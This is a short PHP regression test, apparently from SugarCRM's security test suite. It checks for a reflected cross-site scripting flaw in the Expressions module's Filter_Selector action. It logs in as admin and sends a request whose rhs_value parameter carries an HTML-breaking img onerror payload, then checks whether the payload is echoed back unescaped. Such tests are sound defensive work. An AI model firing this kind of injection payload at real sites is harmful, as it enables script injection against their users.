<?php
/*
 * Your installation or use of this SugarCRM file is subject to the applicable
 * terms available at
 * http://support.sugarcrm.com/Resources/Master_Subscription_Agreements/.
 * If you do not agree to all of the applicable terms or do not have the
 * authority to bind the entity as an authorized representative, then do not
 * install or use this SugarCRM file.
 *
 * Copyright (C) SugarCRM Inc. All rights reserved.
 */
declare(strict_types=1);

use Regression\SugarCRMAssessment;
use Regression\Severity;

class ExpressionFilterSelectorAssessment extends SugarCRMAssessment
{
    public function getSeverity(): ?string
    {
        return Severity::MEDIUM;
    }

    public function getAssessmentDescription(): string
    {
        return 'Reflected XSS in the Expressions module';
    }

    public function run(): void
    {
        $this->login('admin', 'asdf')
            ->bwcLogin()
            ->get('/index.php?module=Expressions&action=Filter_Selector&to_pdf=true&record=1f8c0ace-55db-11ee-ac8b-06de1b3d51c7&lhs_module=Accounts&lhs_field=hint_account_naics_code_lbl&rhs_value=xss"\'></textarea></script><img src=x onerror=alert()>&return_prefix=trigger&operator=Equals&exp_meta_type=count_trigger&parent_type=trigger')
            ->assumeSubstring('value=\'xss"\'></textarea></script><img src=x onerror=alert()>', $xss)
            ->checkAssumptions('rhs_value is not escaped for HTML context', $xss);
    }
}
